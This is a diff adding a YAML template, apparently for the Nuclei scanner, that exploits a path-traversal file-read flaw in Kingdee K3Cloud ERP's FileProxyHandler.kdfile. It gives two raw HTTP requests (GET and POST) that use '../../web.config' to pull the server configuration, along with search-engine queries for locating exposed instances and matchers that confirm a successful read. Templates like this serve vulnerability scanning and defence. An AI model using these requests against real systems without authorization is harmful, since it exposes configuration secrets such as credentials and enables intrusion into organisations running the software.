@@ -1,0 +1,44 @@
+id: kingdee-erp-FileProxyHandler-fileread
+info:
+  name: 金蝶云星空 erp FileProxyHandler.kdfile - fileread
+  author: leadlife
+  severity: high
+  description: 
+  reference: 
+    - https://github.com/exp999fuck/poc_yaml/blob/main/xray-poc/xray-poc-Kingdee-K3cloud-FileProxyHandler.kdfile-file-read.yml
+  metadata:
+    verified: true
+    fofa-query: body="HTML5/content/themes/kdcss.min.css" || app="Kingdee-K3-cloud"
+    hunter-query: app.name="Kingdee 金蝶云星空"
+    quake-query: app:"金蝶云星空"
+    zoomeye-query: app:"金蝶 OA
+  tags: kingdee,fileread,k3cloud
+
+http:
+  - raw:
+      - |
+        GET {{path}}FileProxyHandler.kdfile?Area=0&F=..%2F..%2Fweb.config&Ope=SDL&Step=100000 HTTP/1.1
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36
+        Host: {{Hostname}}
+      
+      - |+
+        POST {{path}}FileProxyHandler.kdfile HTTP/1.1
+        Host: {{Hostname}}
+        SL-CE-SUID: 71
+        Content-Type: application/x-www-form-urlencoded
+
+        Ope=SDL&F=../../web.config&Area=0&Step=100000000
+
+    payloads:
+      path:
+        - /K3Cloud/
+        - /
+
+    attack: batteringram
+    stop-at-first-match: true
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code == 200
+          - contains_all(body,"<?xm","PerfTransMaxLength")
+        condition: and
